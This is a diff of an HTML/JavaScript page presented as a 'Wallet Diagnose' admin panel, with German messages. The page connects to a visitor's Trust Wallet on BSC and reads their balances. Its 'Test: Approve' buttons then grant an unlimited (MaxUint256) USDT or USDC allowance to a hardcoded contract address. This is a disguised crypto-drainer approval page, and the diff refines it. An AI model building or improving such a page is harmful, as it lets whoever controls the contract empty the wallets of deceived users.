@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <title>Admin Diagnosis Panel</title>
+  <title>Admin Diagnose Panel V2</title>
   <style>
     body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
     .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
@@ -21,7 +21,7 @@
 <body>
 
 <div class="box">
-  <h2>Wallet Diagnose</h2>
+  <h2>Wallet Diagnose V2</h2>
 
   <div class="step">
     <span class="step-title">1. Wallet Check</span>
@@ -40,10 +40,11 @@
     <button onclick="approveToken('USDT')">Test: Approve USDT</button>
   </div>
 
-  <div id="status">Warten auf Diagnose...</div>
+  <div id="status">Warten auf Klick...</div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>
+
 <script>
   const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
   const TOKENS = {
@@ -56,7 +57,12 @@
 
   async function runDiagnosis() {
     try {
-      if (!window.ethereum) return setStatus("❌ Kein Provider. Bitte Trust Wallet Browser nutzen!");
+      // Sicherheitscheck ob Ethers geladen ist
+      if (typeof ethers === "undefined") {
+          return setStatus("❌ Bibliothek lädt noch. Bitte 2 Sekunden warten und erneut klicken.");
+      }
+
+      if (!window.ethereum) return setStatus("❌ Bitte im Trust Wallet Browser öffnen!");
       
       const provider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await provider.send("eth_requestAccounts", []);
@@ -68,44 +74,42 @@
       const formattedBNB = ethers.formatEther(balanceBNB);
       document.getElementById("valBNB").innerText = parseFloat(formattedBNB).toFixed(5) + " BNB";
 
-      // 2. USDT/USDC auslesen
-      const abiBalance = ["function balanceOf(address) view returns (uint256)"];
+      // 2. USDT/USDC auslesen (Minimale ABI)
+      const abi = ["function balanceOf(address) view returns (uint256)"];
       
-      const usdtContract = new ethers.Contract(TOKENS.USDT, abiBalance, provider);
-      const usdcContract = new ethers.Contract(TOKENS.USDC, abiBalance, provider);
+      const usdtContract = new ethers.Contract(TOKENS.USDT, abi, provider);
+      const usdcContract = new ethers.Contract(TOKENS.USDC, abi, provider);
 
       const balUSDT = await usdtContract.balanceOf(walletA);
       const balUSDC = await usdcContract.balanceOf(walletA);
 
+      // USDT/USDC haben auf BSC 18 Nachkommastellen
       document.getElementById("valUSDT").innerText = ethers.formatUnits(balUSDT, 18) + " USDT";
       document.getElementById("valUSDC").innerText = ethers.formatUnits(balUSDC, 18) + " USDC";
 
-      if (parseFloat(formattedBNB) < 0.001) {
-        setStatus("⚠️ ACHTUNG: Zu wenig BNB für Gas gefunden!");
-      } else {
-        setStatus("✅ Guthaben erkannt. Versuche nun Schritt 2.");
-      }
+      setStatus("✅ Diagnose abgeschlossen. Was zeigt die Liste oben?");
 
     } catch (e) {
       console.error(e);
-      setStatus("❌ Diagnose fehlgeschlagen: " + e.message);
+      setStatus("❌ Fehler: " + e.message);
     }
   }
 
   async function approveToken(type) {
     try {
-      if(!walletA) return setStatus("❌ Bitte erst Diagnose starten!");
+      if(!walletA) return setStatus("❌ Bitte erst Schritt 1 (Diagnose)!");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      const abi = ["function approve(address s, uint256 a) public returns (bool)"];
+      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
       const contract = new ethers.Contract(TOKENS[type], abi, signer);
       
-      setStatus(`⌛ Teste ${type} Approve mit 120k Gas...`);
-      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 120000 });
+      setStatus(`⌛ Öffne Wallet für ${type} Freigabe...`);
+      // Wir senden Max-Amount
+      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 100000 });
       await tx.wait();
-      setStatus(`✅ Freigabe für ${type} erfolgreich!`);
+      setStatus(`✅ Freigabe für ${type} war erfolgreich!`);
     } catch (e) {
-      setStatus(`❌ Fehler: ${e.message.includes("funds") ? "Nicht genug BNB!" : e.message}`);
+      setStatus(`❌ Abbruch: ${e.message}`);
     }
   }
 </script>
